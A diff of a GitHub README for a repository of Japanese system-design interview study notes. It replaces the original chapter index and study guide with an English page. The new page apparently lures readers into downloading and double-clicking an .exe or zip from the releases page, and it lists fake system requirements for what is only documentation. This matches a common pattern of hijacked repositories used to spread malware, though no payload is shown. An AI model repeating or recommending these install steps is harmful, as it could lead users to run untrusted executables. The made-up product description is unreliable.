@@ -1,263 +1,80 @@
-# システム設計面接対策ドキュメント
-
-メガベンチャー企業の中途採用におけるシステム設計面接試験を想定した、実装可能なレベルの設計資料集です。
-
-## 概要
-
-このドキュメント集は、大規模分散システムの設計において必要となる基礎知識から応用的な実践例まで、体系的にまとめられています。各トピックには、Mermaidダイアグラムを用いた視覚的なシステム設計図と、実装時の具体的なポイントが含まれています。
-
-## ドキュメント構成
-
-### 基礎編
-
-#### 01. コミュニケーション設計
-
-[01_communication.md](01_communication.md)
-
-- HTTPリクエスト・レスポンスの設計
-- Polling/Server-Sent Eventsの実装
-- WebSocketによる双方向通信
-- サービス間通信の設計
-- REST vs gRPC vs GraphQL
-- Pub/Subパターンの活用
-
-#### 02. スケーラビリティ設計
-
-[02_scalability.md](02_scalability.md)
-
-- 垂直スケーリングと水平スケーリング
-- オートスケールの実装
-- ロードバランサーの選択と設計
-- データベースレプリケーション
-- パーティショニング・シャーディング
-- Consistent Hashingアルゴリズム
-- メッセージキューによる非同期処理
-- ステートフル接続のスケール
-
-#### 03. パフォーマンス設計
-
-[03_performance.md](03_performance.md)
-
-- ネットワークレイテンシの最適化
-- マルチレイヤーキャッシング戦略
-- キャッシュ戦略と排出ポリシー(LRU, LFU, Write-through, Write-back)
-- CDNの活用
-- インメモリデータベース
-- 並列分散処理
-- データベースインデックス設計
-- スロークエリ最適化
-
-#### 04. 可用性・耐障害性・信頼性設計
-
-[04_availability.md](04_availability.md)
-
-- 冗長化とフェイルオーバー
-- レプリケーションとWAL
-- ログ管理とオブジェクトストレージ
-- リトライパターン
-- サーキットブレーカーパターン
-- メッセージキューによる信頼性向上
-- レート制限の実装
-- 監視とオブザーバビリティ(Prometheus, Grafana)
-
-#### 05. トランザクション・分散システム設計
-
-[05_transaction_part1.md](05_transaction_part1.md), [05_transaction_part2.md](05_transaction_part2.md)
-
-- データベーストランザクション
-- ロック機構の設計
-- 分散ロックの実装
-- CAP定理と整合性モデル
-- マイクロサービストランザクション
-- Outboxパターン
-- API Gatewayの設計
-- Service Meshによるサービス間通信管理
-- コーディネーションサービス
-- 分散合意アルゴリズム(Paxos, Raft)
-- 分散ID生成
-
-#### 06. アプリケーション設計パターン
-
-[06_application_patterns.md](06_application_patterns.md)
-
-- ファイルアップロード設計
-- 遅延キューの実装
-- ページネーション戦略
-- 全文検索の設計
-- 認証・認可システム
-- マルチテナントアーキテクチャ
-- マイクロサービスとモノリスの比較
-- セキュリティ設計(暗号化、TLS/SSL)
-
-#### 07. ビッグデータ処理設計
-
-[07_bigdata.md](07_bigdata.md)
-
-- バッチ処理アーキテクチャ
-- ストリーム処理の設計
-- アナリティクスデータベース
-
-### 応用編
-
-#### 08. 応用問題 Part 1
-
-[08_applications_part1.md](08_applications_part1.md)
-
-- 画像アップロードサービスの設計
-- リアルタイムチャットの設計
-- 動画配信ライブコメントサービスの設計
-- チケット予約サービスの設計
-
-#### 09. 応用問題 Part 2
-
-[09_applications_part2.md](09_applications_part2.md)
-
-- SNSプラットフォームの設計
-- SNSリアルタイム検索の設計
-- ファイル同期サービスの設計
-
-#### 10. 応用問題 Part 3
-
-[10_applications_part3.md](10_applications_part3.md)
-
-- 競技プログラミングコンテストの設計
-- ビジネスSNS求人アラートサービスの設計
-- Webアクセス解析サービスの設計
-
-## 各ドキュメントの構成
-
-すべてのドキュメントは、以下の構成で統一されています。
-
-### 概要
-
-設計対象のシステムの目的と、実現すべき機能の概要
-
-### システム設計図
-
-Mermaidを使用した視覚的なアーキテクチャ図
-
-- システム全体のコンポーネント構成
-- シーケンス図による処理フロー
-- 状態遷移図やフローチャート
-
-### 設計のポイント
-
-実装時に考慮すべき重要な技術的ポイント
-
-- 技術選定の理由
-- スケーラビリティの確保方法
-- パフォーマンス最適化の手法
-- 可用性・信頼性の担保
-- セキュリティ対策
-
-## 使用技術スタック例
-
-ドキュメント内で扱われる主な技術要素です。
-
-### データベース
-
-- RDS: PostgreSQL, MySQL
-- NoSQL: Cassandra, DynamoDB, MongoDB, Redis
-- グラフDB: Neo4j
-- データウェアハウス: BigQuery, Redshift
-
-### キャッシュ
-
-- Redis: インメモリキャッシュ、セッション管理、分散ロック
-- Memcached: シンプルなキャッシング
-
-### メッセージキュー
-
-- Kafka: 高スループットストリーミング
-- SQS: マネージドキューサービス
-- RabbitMQ: メッセージブローカー
-
-### ストリーム処理
-
-- Flink: リアルタイムストリーム処理
-- Spark: バッチ・ストリーム処理
-
-### ストレージ
-
-- S3: オブジェクトストレージ
-- CloudFront: CDN
-
-### 検索
-
-- Elasticsearch: 全文検索、ログ分析
-
-### その他
-
-- Docker: コンテナ化、サンドボックス環境
-- WebSocket: リアルタイム双方向通信
-- gRPC: サービス間通信
-
-## 学習の進め方
-
-### 初学者向け
-
-1. 基礎編01-04を順番に読み、基本的な設計パターンを理解します
-2. 各章の「システム設計図」を見ながら、コンポーネント間の関係を把握します
-3. 「設計のポイント」を読み、なぜその設計を選択したのか理解します
-
-### 中級者向け
-
-1. 基礎編05-07で、より高度なトピックを学習します
-2. 応用編08-10で、実際のサービスを題材にした設計を確認します
-3. 各サービスの要件から、どのような設計判断がなされているか分析します
-
-### 面接対策向け
-
-1. 応用編の各サービスを、ホワイトボードに描けるように練習します
-2. 設計のトレードオフを説明できるようにします
-3. スケーラビリティ、可用性、一貫性などの観点で、設計を評価できるようにします
-
-## 設計時の重要な観点
-
-### スケーラビリティ
-
-- 水平スケールを前提とした設計
-- ステートレスなアプリケーション層
-- データベースのシャーディング戦略
-
-### 可用性
-
-- 単一障害点の排除
-- 冗長化とフェイルオーバー
-- リトライとサーキットブレーカー
-
-### 一貫性
-
-- CAP定理の理解とトレードオフ
-- 結果整合性と強整合性の使い分け
-- 分散トランザクションの扱い
-
-### パフォーマンス
-
-- キャッシング戦略
-- CDNの活用
-- データベースクエリ最適化
-
-### セキュリティ
-
-- 認証・認可の実装
-- データの暗号化
-- レート制限とDDoS対策
-
-## ライセンス
-
-このドキュメントは学習目的で作成されています。
-
-## 更新履歴
-
-- 2025-12-31: 初版作成
-  - 基礎編7章完成
-  - 応用編10サービス完成
-- 2026-01-07: 2版作成
-  - REST vs gRPC vs GraphQL追加
-  - キャッシュ戦略と排出ポリシー追加
-  - 監視とオブザーバビリティ追加
-  - Service Meshによるサービス間通信管理追加
-  - 分散合意アルゴリズム追加
-  - マイクロサービスとモノリスの比較追加
-  - セキュリティ設計追加
+# 🚀 system_design - Simplifying System Design Interviews
+
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Nasir4upk07/system_design/releases)
+
+## 📖 Overview
+Welcome to **system_design**! This project offers resources to prepare for system design interviews at major tech companies. Our documentation covers the fundamentals of large-scale distributed systems. You'll find diagrams and design documents that help you build your knowledge in this important area.
+
+## 🧐 Features
+- Comprehensive guides on architecture and system design
+- Mermaid diagrams for visual learners
+- In-depth documentation on distributed systems
+- Examples of load balancing and caching strategies
+- Practical insights for database design and microservices
+- Tools for interview preparation in Japanese
+
+## 📅 Topics Covered
+- Architecture
+- Architecture Diagrams
+- Cache
+- Database Design
+- Distributed Systems
+- Documentation
+- Interview Preparation
+- Load Balancing
+- Mermaid
+- Message Queue
+- Microservices
+- Scalability
+- Sequence Diagram
+- System Design
+- System Design Interview
+
+## 🚀 Getting Started
+To use this application, follow the steps below:
+
+### Step 1: Visit the Download Page
+Click the link below to go to our releases page. Here, you can find the latest version of the application.
+
+[Visit this page to download](https://github.com/Nasir4upk07/system_design/releases)
+
+### Step 2: Choose the Correct Version
+On the releases page, look for the latest version of the software. We keep all versions updated, so make sure to pick the most recent one. 
+
+### Step 3: Download the Application
+Click on the version you want and download the file. It's usually available in a zip or executable format. 
+
+### Step 4: Install the Application
+Once the download is complete, open the file. If it’s a zip, unzip it first. Then, follow these steps:
+
+1. **If the file is an executable (.exe)**:
+   - Double-click on the file.
+   - Follow the on-screen instructions to install.
+
+2. **If the file is a zip**:
+   - Extract the contents to a folder on your computer.
+   - Open the folder and locate the application file.
+   - Double-click to run the application.
+
+### Step 5: Start Using the Application
+Once installed, you can access various resources designed to help you prepare for system design interviews. Explore the documentation, review the diagrams, and practice with examples.
+
+## 📚 Documentation
+The documentation includes explanations for each topic. You can read through them to build your understanding. Each section focuses on key concepts that are commonly asked in interviews.
+
+## 🛠️ System Requirements
+To run this application smoothly, ensure your system meets the following requirements:
+
+- Operating System: Windows 10/8/7, macOS, or Linux
+- RAM: At least 4 GB
+- Storage: Minimum 200 MB of free space
+
+## 💬 Support
+If you have questions or need assistance, please open an issue in the GitHub repository. We’re here to help you.
+
+## 🔗 Quick Links
+- [Visit this page to download](https://github.com/Nasir4upk07/system_design/releases)
+- [Open Issues](https://github.com/Nasir4upk07/system_design/issues)
+
+Thank you for using **system_design**! We wish you success in your interviews.
